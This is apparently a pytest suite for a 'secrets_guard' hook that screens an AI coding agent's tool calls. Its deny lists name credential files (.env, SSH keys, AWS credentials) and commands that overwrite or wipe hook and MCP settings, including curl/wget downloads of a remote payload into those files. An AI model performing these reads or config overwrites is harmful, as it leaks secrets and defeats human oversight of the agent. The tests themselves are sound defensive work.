import json
import subprocess
import sys
from pathlib import Path

import pytest
from helpers import load_hook

secrets_guard = load_hook("pre_tool_use/secrets_guard.py")

CFG = {"enabled": True, "protected_paths": [], "allow_paths": []}


def _event(tool, **tool_input):
    return {"tool_name": tool, "tool_input": tool_input}


DENY_EVENTS = [
    _event("Read", file_path="/proj/.env"),
    _event("Edit", file_path="/proj/.env.production"),
    _event("Write", file_path="/proj/server.pem"),
    _event("Read", file_path="~/.ssh/id_rsa"),
    _event("Read", file_path="~/.aws/credentials"),
    _event("Bash", command="cat .env"),
    _event("Bash", command="less ~/.ssh/id_ed25519"),
]

ALLOW_EVENTS = [
    _event("Read", file_path="/proj/.env.example"),
    _event("Read", file_path="/proj/.env.sample"),
    _event("Read", file_path="~/.ssh/id_rsa.pub"),
    _event("Read", file_path="/proj/src/app.py"),
    _event("Bash", command="cat .env.example"),
    _event("Bash", command="git status"),
]


@pytest.mark.parametrize("event", DENY_EVENTS)
def test_denied(event):
    v = secrets_guard.evaluate(event, CFG)
    assert v is not None and v["decision"] == "deny", event


@pytest.mark.parametrize("event", ALLOW_EVENTS)
def test_allowed(event):
    assert secrets_guard.evaluate(event, CFG) is None, event


def test_config_protected_paths_extend():
    cfg = dict(CFG, protected_paths=["config/secrets/*"])
    v = secrets_guard.evaluate(_event("Read", file_path="config/secrets/db.yaml"), cfg)
    assert v["decision"] == "deny"


def test_config_allow_paths_extend():
    cfg = dict(CFG, allow_paths=[".env.template"])
    assert secrets_guard.evaluate(_event("Read", file_path="/proj/.env.template"), cfg) is None


def test_bash_non_path_tokens_ignored():
    assert secrets_guard.evaluate(_event("Bash", command="grep -rn credentials src/"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command='find . -name "*.pem"'), CFG) is None


def test_bash_path_like_tokens_still_denied():
    v1 = secrets_guard.evaluate(_event("Bash", command="cat secrets.yaml"), CFG)
    assert v1["decision"] == "deny"
    v2 = secrets_guard.evaluate(_event("Bash", command="cp .env.example .env"), CFG)
    assert v2["decision"] == "deny"


def test_write_protected_edit_denied():
    for path in [".claude-hooks.json", "/proj/.claude/settings.json",
                 "/proj/.claude/settings.local.json"]:
        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
        assert v is not None and v["decision"] == "deny", path
        v2 = secrets_guard.evaluate(_event("Edit", file_path=path), CFG)
        assert v2 is not None and v2["decision"] == "deny", path


def test_write_protected_read_allowed():
    assert secrets_guard.evaluate(_event("Read", file_path=".claude-hooks.json"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command="cat .claude-hooks.json"), CFG) is None


def test_write_protected_bash_mutation_denied():
    for cmd in ["echo x > .claude-hooks.json", "rm .claude-hooks.json",
                "sed -i s/a/b/ .claude/settings.json"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_write_protected_does_not_block_unrelated_settings():
    for path in ["/app/.vscode/settings.json", "/app/webhooks/hooks.json"]:
        assert secrets_guard.evaluate(_event("Write", file_path=path), CFG) is None, path


def test_write_protected_read_with_redirect_allowed():
    # 保護ファイルの「読取」はリダイレクトを伴っても通す(2>/dev/null 等)
    for cmd in ["cat .claude-hooks.json 2>/dev/null",
                "cat .claude-hooks.json > /tmp/out.json",
                "grep foo .claude-hooks.json 2>&1"]:
        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd


def test_write_protected_config_extends():
    cfg = dict(CFG, write_protected_paths=["deploy.lock"])
    v = secrets_guard.evaluate(_event("Write", file_path="deploy.lock"), cfg)
    assert v["decision"] == "deny"


def test_write_protected_glued_redirect_and_dd_denied():
    for cmd in ["echo x >.claude-hooks.json",
                "echo x>>.claude-hooks.json",
                "dd if=/dev/zero of=.claude-hooks.json"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_write_protected_mcp_and_claude_json_denied():
    # MCPサーバ定義・グローバル設定は任意コマンド実行経路になるため書込保護(0.5.0)
    for path in [".mcp.json", "/proj/.mcp.json", "/home/alice/.claude.json"]:
        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
        assert v is not None and v["decision"] == "deny", path
    assert secrets_guard.evaluate(_event("Read", file_path=".mcp.json"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command="cat .mcp.json"), CFG) is None


def test_download_output_to_protected_denied():
    for cmd in [
        "curl -o .claude-hooks.json https://example.com/payload",
        "curl -fsSLo .mcp.json https://example.com/payload",
        "curl -o.claude-hooks.json https://example.com/payload",
        "curl --output .claude/settings.json https://example.com/payload",
        "wget -O .claude/settings.json https://example.com/payload",
        "wget --output-document=.mcp.json https://example.com/payload",
        "git pull && curl -o .claude-hooks.json https://example.com/payload",
        "wget -o .claude-hooks.json https://example.com/payload",
        "wget --output-file=.claude/settings.json https://example.com/payload",
        "wget -a .mcp.json https://example.com/payload",
        "curl https://x.example | wget -O .claude-hooks.json -",
    ]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_download_read_and_unprotected_output_allowed():
    for cmd in [
        "curl https://example.com/repo/.claude/settings.json",
        "curl -o /tmp/page.html https://example.com/",
        "curl --output result.json https://example.com/api",
        "curl -O https://example.com/file.tar.gz",
        "wget -O - https://example.com/notes.txt",
        "wget https://example.com/file.tar.gz",
        "wget -o /tmp/wget.log https://example.com/file.tar.gz",
        "wget --append-output=/tmp/wget.log https://example.com/file.tar.gz",
    ]:
        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd


def test_deny_survives_enabled_false_blackbox(tmp_path):
    (tmp_path / ".claude-hooks.json").write_text(
        '{"secrets_guard": {"enabled": false}}', encoding="utf-8"
    )
    script = (Path(__file__).resolve().parent.parent
              / "hooks" / "pre_tool_use" / "secrets_guard.py")
    event = {"tool_name": "Read", "cwd": str(tmp_path),
             "tool_input": {"file_path": "/proj/.env"}}
    r = subprocess.run([sys.executable, str(script)], input=json.dumps(event),
                       capture_output=True, text=True, timeout=30)
    assert r.returncode == 0
    out = json.loads(r.stdout)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "systemMessage" in out
